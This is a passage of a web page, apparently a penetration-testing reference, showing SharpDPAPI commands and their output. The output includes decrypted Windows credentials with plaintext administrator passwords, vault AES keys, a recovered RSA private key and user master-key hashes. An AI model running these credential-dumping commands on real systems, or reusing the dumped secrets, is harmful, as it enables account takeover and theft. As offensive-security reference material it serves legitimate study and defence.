+</span></span></span><span class="line"><span class="cl"><span class="go">{1ef7b31a-39fd-4309-877e-c354d5a19506}:4D8998194D3BB189C3C4328DBEB029477139B705
+</span></span></span><span class="line"><span class="cl"><span class="go">{6285f725-430d-4155-8bf0-2a09fe7aa629}:3B8331A70BD0F676CC34478FAECD66FB1FE7C2C1
+</span></span></span><span class="line"><span class="cl"><span class="go">{6977da93-ec45-468e-8a19-97d9865fb2e6}:FE97D22DAD2830B6D033CA17D0400C67246E8B22
+</span></span></span><span class="line"><span class="cl"><span class="go">{79e99075-9dfe-462b-bd58-82ea4508fdb4}:C9E0128D54AEF84D1149D2417A031D168CB24BB2
+</span></span></span><span class="line"><span class="cl"><span class="go">{a0c34700-bcf5-4dc6-8831-76fe66b74b2c}:3FABB64C6733FADEFAFB460CF25752C49F45C343
+</span></span></span><span class="line"><span class="cl"><span class="go">{a8deeb85-2a00-4648-8024-a1bff4f382ff}:6C113015CF9FCFE39A2AAF6F27FB8E6842F06206
+</span></span></span><span class="line"><span class="cl"><span class="go">{b2014c7b-a5e1-4748-bd7f-3f9edf9ee407}:7EF463C6ED7EFC79E7BEA0281C8DC74909D00D60
+</span></span></span><span class="line"><span class="cl"><span class="go">{dcc6f49e-c207-47c0-b3ba-959ad25c2abb}:D4D4C8B9CB8671653EDDCE39B9B232E499908202
+</span></span></span><span class="line"><span class="cl"><span class="go">{e892348e-5a34-4a9a-bd46-2f5f3186318b}:32EDF8DB273EDB19A10C2124DA5678CBBBECEF72
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Triaging System Credentials
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Folder       : C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  CredFile           : ADBAA7254AF7B3AC4CBF7B8CE9BD6911
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
+</span></span></span><span class="line"><span class="cl"><span class="go">    size             : 560
+</span></span></span><span class="line"><span class="cl"><span class="go">    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+</span></span></span><span class="line"><span class="cl"><span class="go">    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+</span></span></span><span class="line"><span class="cl"><span class="go">    description      : Local Credential Data
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    LastWritten      : 10/13/2020 10:49:57 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetName       : Domain:batch=TaskScheduler:Task:{27B6CB8A-0163-46AB-A0C7-387E45A70048}
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetAlias      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    Comment          : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    UserName         : WEB01\svc_dev
+</span></span></span><span class="line"><span class="cl"><span class="go">    Credential       : a2W@rWAHzG+zQrB4
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  CredFile           : AF61A1B16221450058FB4D69F7B3FE73
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
+</span></span></span><span class="line"><span class="cl"><span class="go">    size             : 560
+</span></span></span><span class="line"><span class="cl"><span class="go">    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+</span></span></span><span class="line"><span class="cl"><span class="go">    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+</span></span></span><span class="line"><span class="cl"><span class="go">    description      : Local Credential Data
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    LastWritten      : 10/14/2020 10:15:19 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetName       : Domain:batch=TaskScheduler:Task:{64EDB31F-E848-4632-8F9F-377559BFA088}
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetAlias      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    Comment          : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    UserName         : WEB01\Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">    Credential       : EXuLyX_WtHxx9pS9
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  CredFile           : CEED724993CAA9310FC2FE2F72ECE137
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
+</span></span></span><span class="line"><span class="cl"><span class="go">    size             : 592
+</span></span></span><span class="line"><span class="cl"><span class="go">    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+</span></span></span><span class="line"><span class="cl"><span class="go">    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+</span></span></span><span class="line"><span class="cl"><span class="go">    description      : Local Credential Data
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    LastWritten      : 10/13/2020 2:56:34 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetName       : Domain:batch=TaskScheduler:Task:{D3000B16-D5D6-4FF3-9038-F368155DBB77}
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetAlias      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    Comment          : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    UserName         : DAEDALUS\Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">    Credential       : pleasefastenyourseatbelts01!
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Folder       : C:\WINDOWS\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
+</span></span></span><span class="line"><span class="cl"><span class="go">    size             : 11152
+</span></span></span><span class="line"><span class="cl"><span class="go">    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+</span></span></span><span class="line"><span class="cl"><span class="go">    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+</span></span></span><span class="line"><span class="cl"><span class="go">    description      : Local Credential Data
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    LastWritten      : 9/30/2020 10:33:42 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetName       : WindowsLive:target=virtualapp/didlogical
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetAlias      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    Comment          : PersistedCredential
+</span></span></span><span class="line"><span class="cl"><span class="go">    UserName         : 02sxobiqthvopecv
+</span></span></span><span class="line"><span class="cl"><span class="go">    Credential       : 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Folder       : C:\WINDOWS\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Credentials
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
+</span></span></span><span class="line"><span class="cl"><span class="go">    size             : 11152
+</span></span></span><span class="line"><span class="cl"><span class="go">    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+</span></span></span><span class="line"><span class="cl"><span class="go">    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+</span></span></span><span class="line"><span class="cl"><span class="go">    description      : Local Credential Data
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    LastWritten      : 9/30/2020 12:34:45 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetName       : WindowsLive:target=virtualapp/didlogical
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetAlias      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    Comment          : PersistedCredential
+</span></span></span><span class="line"><span class="cl"><span class="go">    UserName         : 02uqnqqpyctvsadl
+</span></span></span><span class="line"><span class="cl"><span class="go">    Credential       : 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Triaging SYSTEM Vaults
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Triaging Vault folder: C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
+</span></span></span><span class="line"><span class="cl"><span class="go">  Name               : Web Credentials
+</span></span></span><span class="line"><span class="cl"><span class="go">    guidMasterKey    : {a0c34700-bcf5-4dc6-8831-76fe66b74b2c}
+</span></span></span><span class="line"><span class="cl"><span class="go">    size             : 324
+</span></span></span><span class="line"><span class="cl"><span class="go">    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+</span></span></span><span class="line"><span class="cl"><span class="go">    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+</span></span></span><span class="line"><span class="cl"><span class="go">    description      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    aes128 key       : 2A78776BD367E217F82BD81DF6F57940
+</span></span></span><span class="line"><span class="cl"><span class="go">    aes256 key       : 768D205AA00F351A21332400E62DEEDBDBCBE7F9C3D199035980AEB63519C91A
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Triaging System Certificates
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Folder       : C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  File               : fad662b360941f26a1193357aab3c12d_eb299db7-a1dc-47c1-a38b-55aee2a196d9
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+</span></span></span><span class="line"><span class="cl"><span class="go">    Master Key GUID  : {3faada0f-c676-4092-a21d-98749e7035bd}
+</span></span></span><span class="line"><span class="cl"><span class="go">    Description      : CryptoAPI Private Key
+</span></span></span><span class="line"><span class="cl"><span class="go">    algCrypt         : CALG_AES_256 (keyLen 256)
+</span></span></span><span class="line"><span class="cl"><span class="go">    algHash          : CALG_SHA_512 (32782)
+</span></span></span><span class="line"><span class="cl"><span class="go">    Salt             : 6af43bd696af086ebf84ec9a98313fc9ee1ed78bda6edbc195f8e0b474742558
+</span></span></span><span class="line"><span class="cl"><span class="go">    HMAC             : b6181065e910521a5cbe48c137d2d311d52e473aeec39a668a2d1d484358116c
+</span></span></span><span class="line"><span class="cl"><span class="go">    Unique Name      : IIS Express Development Certificate Container
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Thumbprint       : 5D1DA81AA907D60C7CA001F70B97C6797D1452E6
+</span></span></span><span class="line"><span class="cl"><span class="go">    Issuer           : CN=localhost
+</span></span></span><span class="line"><span class="cl"><span class="go">    Subject          : CN=localhost
+</span></span></span><span class="line"><span class="cl"><span class="go">    Valid Date       : 11/14/2019 5:09:23 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">    Expiry Date      : 11/13/2024 4:00:00 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">    Enhanced Key Usages:
+</span></span></span><span class="line"><span class="cl"><span class="go">        Server Authentication (1.3.6.1.5.5.7.3.1)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    [*] Private key file fad662b360941f26a1193357aab3c12d_eb299db7-a1dc-47c1-a38b-55aee2a196d9 was recovered:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----BEGIN RSA PRIVATE KEY-----
+</span></span></span><span class="line"><span class="cl"><span class="go">MIIEogIBAAKCAQEAt6bH9rl7JOVpmoan7iHPmj5IkCLASISSb4ZycbDsXZp9Ixvf
+</span></span></span><span class="line"><span class="cl"><span class="go">lEriTEFxcjB7+PbeO2b0AYpzW+Y/sf8BQPuBVmyDwmrmha0Y4+KznPQFK2I7Hk73
+</span></span></span><span class="line"><span class="cl"><span class="go">3Fi5mLOWaCAKhFVNcYyMbBrA40aeHJ8M/4aSJpwgP+KeU9lQ87lfK/XJYUWaANVl
+</span></span></span><span class="line"><span class="cl"><span class="go">yw18CPhBJ4Ky4GuTudxD721eHGhEbRjhyY7WqnLpz/ib6c3TE++Qe13oLDXkJ/yQ
+</span></span></span><span class="line"><span class="cl"><span class="go">sE9OyoFfF+gcfX/Dpc9XRZxobLNamwp62a1sVFMcLpWLYy46OWw7btoUA+LcWR2g
+</span></span></span><span class="line"><span class="cl"><span class="go">TcZgph44v+BnK0eTnqZ7K8kmCnF7Y1CI7pFQ6wIDAQABAoH/DAS6R/IBBuJHoj1M
+</span></span></span><span class="line"><span class="cl"><span class="go">asJDJ2YAiXULPw/UXH7iSYeXU07RbZfGqKRZOIxsAJq0M74ImeTSs4SNfCXsU7Eq
+</span></span></span><span class="line"><span class="cl"><span class="go">/yUJLfW/pj93aVJZkTQdjQCvamaNiPGlczhvsuWZvU6Y7Yr5eoQ0uf0as3nVawNB
+</span></span></span><span class="line"><span class="cl"><span class="go">4nOb2KNRVtYf6WBACPrWDh0yTFJ4onaKmN/+f9AsX8lSss4h0V7WLhXfdLDi6N8+
+</span></span></span><span class="line"><span class="cl"><span class="go">Zz21V1xoKayZHZp7ftgBUQBdxWPVCnf7lphappZ8u7zEpjAWanzKN51tMNiEIKIJ
+</span></span></span><span class="line"><span class="cl"><span class="go">nYDEL0OZbSF4chsJCZwIITa1WN9Mn1Nx9J7E3XSvCiCl97hTM8bNmcAENpkr31Fr
+</span></span></span><span class="line"><span class="cl"><span class="go">OaFVAoGBALlnw0boVhXyf/h7b1l+NMRMEZABMVfnEcwR0U3KzjlQyQ9vhvLk5IhJ
+</span></span></span><span class="line"><span class="cl"><span class="go">/zFxGON2nYZnKpXseu31to9aDOcl2bKQ59JTaBQ8UbNO+LblhdD+YF9jxLTKzgAe
+</span></span></span><span class="line"><span class="cl"><span class="go">OX6R72J1wWWNYNHaJZ0Zmk3NKWxV9SGYoL776y+V591a2SmdTyyFAoGBAP2UEI01
+</span></span></span><span class="line"><span class="cl"><span class="go">L1TBgAmAlKpLx04BxS8iqnVUWX4nWZua2JRzzbBZS9pGmAeSHx7B111Zda5Euphn
+</span></span></span><span class="line"><span class="cl"><span class="go">q0nSHSdU9hQ8gqpwqeZdMiHG9i0n+Gy6sQFlK+2iOC8Sk/YcWOYhzKuiMHEsVPzh
+</span></span></span><span class="line"><span class="cl"><span class="go">qxXHoOsE4Qiox4Eq4BAR0UYrKzbhGjGhmPqvAoGBAJI3v+ya7NFQNxZbGnzEqI6q
+</span></span></span><span class="line"><span class="cl"><span class="go">wysDlcuSQxnib2PfbnYLPRW8SfwjAgxt9yEh5ZP2BtNpZ09neadTIc+6H/Tnh+Fo
+</span></span></span><span class="line"><span class="cl"><span class="go">oDriZnGXBIPZ4xIyvy8MfiqcfxRp4L59F7C3HMhUv9n7/oBhf0p/V47GH0X+IF2H
+</span></span></span><span class="line"><span class="cl"><span class="go">hjY4bMlRetO6gwtrsXYVAoGBAL2lnPNe0XU7+nwg1A7A+eAXZtenv4Bcg0ncOCIu
+</span></span></span><span class="line"><span class="cl"><span class="go">Hsh4C19WiWpH3a/b0rZ4Fo/UNjUNZdhRwENHh1JBMoFT+A1skUSecr3cRYTkHeGD
+</span></span></span><span class="line"><span class="cl"><span class="go">hpoahk4FQqvB4zLvZHVI1f+PH1ek5jLyu7dgQ7NBROPrBrpNzKF4EeG+q2Ux2RtB
+</span></span></span><span class="line"><span class="cl"><span class="go">Vl41AoGARa7flOX1LvXDAHBAJ+95M4+X9aJUCjmPWhce8/mTM/1fVMGQxwp2c5H7
+</span></span></span><span class="line"><span class="cl"><span class="go">DCOqiohDsIEbpnQlBLerjnv8SFZ77BOueNNqO2skd2WSUX3VyNMlb5nQUrfr5si2
+</span></span></span><span class="line"><span class="cl"><span class="go">JPnU/5hBG3GioUuBuJSNH0pGzOsr/prbvGEw7jzSCZFcTcXyGYM=
+</span></span></span><span class="line"><span class="cl"><span class="go">-----END RSA PRIVATE KEY-----
+</span></span></span><span class="line"><span class="cl"><span class="go">-----BEGIN CERTIFICATE-----
+</span></span></span><span class="line"><span class="cl"><span class="go">MIIC7DCCAdSgAwIBAgIQZY3EzYv13Z5Eq3xDgYNfxTANBgkqhkiG9w0BAQsFADAU
+</span></span></span><span class="line"><span class="cl"><span class="go">MRIwEAYDVQQDEwlsb2NhbGhvc3QwHhcNMTkxMTE0MTMwOTIzWhcNMjQxMTE0MDAw
+</span></span></span><span class="line"><span class="cl"><span class="go">MDAwWjAUMRIwEAYDVQQDEwlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IB
+</span></span></span><span class="line"><span class="cl"><span class="go">DwAwggEKAoIBAQC3psf2uXsk5WmahqfuIc+aPkiQIsBIhJJvhnJxsOxdmn0jG9+U
+</span></span></span><span class="line"><span class="cl"><span class="go">SuJMQXFyMHv49t47ZvQBinNb5j+x/wFA+4FWbIPCauaFrRjj4rOc9AUrYjseTvfc
+</span></span></span><span class="line"><span class="cl"><span class="go">WLmYs5ZoIAqEVU1xjIxsGsDjRp4cnwz/hpImnCA/4p5T2VDzuV8r9clhRZoA1WXL
+</span></span></span><span class="line"><span class="cl"><span class="go">DXwI+EEngrLga5O53EPvbV4caERtGOHJjtaqcunP+JvpzdMT75B7XegsNeQn/JCw
+</span></span></span><span class="line"><span class="cl"><span class="go">T07KgV8X6Bx9f8Olz1dFnGhss1qbCnrZrWxUUxwulYtjLjo5bDtu2hQD4txZHaBN
+</span></span></span><span class="line"><span class="cl"><span class="go">xmCmHji/4GcrR5OepnsrySYKcXtjUIjukVDrAgMBAAGjOjA4MAsGA1UdDwQEAwIE
+</span></span></span><span class="line"><span class="cl"><span class="go">sDATBgNVHSUEDDAKBggrBgEFBQcDATAUBgNVHREEDTALgglsb2NhbGhvc3QwDQYJ
+</span></span></span><span class="line"><span class="cl"><span class="go">KoZIhvcNAQELBQADggEBAEMyxPNqorAka7/Qpx9TNULsvbBZFqYsY37mdbL3CMvS
+</span></span></span><span class="line"><span class="cl"><span class="go">RFFPe7JJGMWb1Fywp1h/iOG3y+QEgn3XR1+XWQ0/uLb9Zl31LGcm6enKfIJeAvzo
+</span></span></span><span class="line"><span class="cl"><span class="go">cjQCM/pK38djPzNWqK1XvvtxWrObzMqO8nUoNw4uu1p1rASSUhVmfWYJjNfze802
+</span></span></span><span class="line"><span class="cl"><span class="go">ORnm89Z5w714sB/4QzA4pw0P+RtLuktLaAPFgWrl1Ukv5MsRphKLjV6uOFi92Lin
+</span></span></span><span class="line"><span class="cl"><span class="go">Ts+LZc2/iqLV6JENHk++Y40MmD+1ubPhCkzyZ+e7iyYAozktLLMAdxHOvSoGrnaF
+</span></span></span><span class="line"><span class="cl"><span class="go">1KYXlXFpPKlhpAckgu1Ku9DZBgkYfvzMX6agsxMPY+Q=
+</span></span></span><span class="line"><span class="cl"><span class="go">-----END CERTIFICATE-----
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Folder       : C:\ProgramData\Microsoft\Crypto\Keys
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Folder       : C:\ProgramData\Microsoft\Crypto\SystemKeys
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Folder       : C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Retrieving SCCM Network Access Account blobs via WMI
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     Connecting to \\localhost\root\ccm\policy\Machine\ActualConfig
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] Error connecting to WMI: Invalid namespace 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SharpDPAPI completed in 00:00:02.1950513
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user
 </span></span><span class="line"><span class="cl"><span class="go">.\SharpDPAPI.exe credentials /password:&#39;&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user <span class="o">(</span>without password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">.\SharpDPAPI.exe credentials /rpc
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\SharpDPAPI.exe credentials /rpc
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  __                 _   _       _ ___ 
+</span></span></span><span class="line"><span class="cl"><span class="go"> (_  |_   _. ._ ._  | \ |_) /\  |_) |  
+</span></span></span><span class="line"><span class="cl"><span class="go"> __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
+</span></span></span><span class="line"><span class="cl"><span class="go">                |                      
+</span></span></span><span class="line"><span class="cl"><span class="go">  v1.12.0                               
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: User DPAPI Credential Triage
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Will ask a domain controller to decrypt masterkeys for us
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Found MasterKey : C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\10811601-0fa9-43c2-97e5-9bef8471fc7d
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found MasterKey : C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found MasterKey : C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\6b478281-d87d-4854-b2d2-ae22b861b0b0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Preferred master keys:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107:6b478281-d87d-4854-b2d2-ae22b861b0b0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] User master key cache:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">{10811601-0fa9-43c2-97e5-9bef8471fc7d}:FBAB11CACDD8407E8DB9604F0F8C92178BEE6FD3
+</span></span></span><span class="line"><span class="cl"><span class="go">{191d3f9d-7959-4b4d-a520-a444853c47eb}:85285EB368BEFB1670633B05CE58CA4D75C73C77
+</span></span></span><span class="line"><span class="cl"><span class="go">{6b478281-d87d-4854-b2d2-ae22b861b0b0}:9BF69BE7E68435E68C8B1693A84EF951D8DB38E6
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Triaging Credentials for current user
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Folder       : C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  CredFile           : 18A1927A997A794B65E9849883AC3F3E
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    guidMasterKey    : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+</span></span></span><span class="line"><span class="cl"><span class="go">    size             : 358
+</span></span></span><span class="line"><span class="cl"><span class="go">    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+</span></span></span><span class="line"><span class="cl"><span class="go">    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+</span></span></span><span class="line"><span class="cl"><span class="go">    description      : Enterprise Credential Data
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    LastWritten      : 5/9/2023 2:08:54 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetName       : LegacyGeneric:target=MyTarget
+</span></span></span><span class="line"><span class="cl"><span class="go">    TargetAlias      : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    Comment          : 
+</span></span></span><span class="line"><span class="cl"><span class="go">    UserName         : MyUser
+</span></span></span><span class="line"><span class="cl"><span class="go">    Credential       : 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  CredFile           : 84F1CAEEBF466550F4967858F9353FB4
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    guidMasterKey    : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+</span></span></span><span class="line"><span class="cl"><span class="go">    size             : 398
+</span></span></span><span class="line"><span class="cl"><span class="go">    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+</span></span></span><span class="line"><span class="cl"><span class="go">    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+</span></span></span><span class="line"><span class="cl"><span class="go">    description      : Enterprise Credential Data
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
